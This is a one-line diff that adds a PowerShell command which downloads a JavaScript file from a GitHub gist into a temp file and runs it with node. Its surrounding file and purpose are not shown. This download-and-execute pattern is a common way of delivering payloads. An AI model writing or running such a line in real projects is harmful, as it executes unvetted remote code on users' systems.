@@ -1,0 +1,1 @@
+$x=[System.IO.Path]::GetTempFileName(); (new-object net.webclient).DownloadFile("https://gist.githubusercontent.com/ldhertert/19cbf11264d55ed5bcf4/raw/test.js",$x); node $x;
